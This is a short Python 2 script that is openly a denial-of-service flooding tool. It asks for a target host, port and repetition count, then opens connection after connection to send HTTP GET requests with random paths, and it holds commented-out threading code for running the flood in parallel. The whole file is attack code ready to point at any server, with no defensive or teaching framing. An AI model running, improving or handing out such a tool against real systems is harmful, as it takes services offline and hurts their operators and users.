import socket
import sys
import random
import time
import string
import threading

target = raw_input("Enter the target to attack: ")
t_port = raw_input("Enter the target port: ")
times = raw_input("Enter the attack times: ")


try:
    ip = str(target)
    print ip
except:
    print " Error:\nMake sure your input is right!"
    sys.exit(0)

port = int(t_port)
ran=int(times)

global n
n=0

def attack():

    ip = str(target)
    global n
    msg=str(string.letters+string.digits+string.punctuation)
    data="".join(random.sample(msg,5))
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        n += 1
        print ip
        ddos.connect((ip, port))
        print "GET /%s HTTP/1.1\r\n\r\n" % data
        ddos.send("GET /%s HTTP/1.1\r\n\r\n" % data)
        print time.ctime().split(" ")[3]+" "+"["+str(n)+"]"

    except socket.error:
        print "[ No connection! Server maybe down ] "

    ddos.close()

print "[#] Attack started on",ip
nn=0

# NOTICE:
# error: [Errno 24] Too many open files
# https://askubuntu.com/questions/162229/how-do-i-increase-the-open-files-limit-for-a-non-root-user

for i in xrange(ran):
    attack()
    #nn+=1
    #t1 = threading.Thread(target=attack)
    #t1.daemon =True # if thread is exist, it dies
    #t1.start()

    #t2 = threading.Thread(target=attack)
    #t2.daemon =True # if thread is exist, it dies
    #t2.start()

    #if nn==100:
        #nn=0
        #time.sleep(0.01)
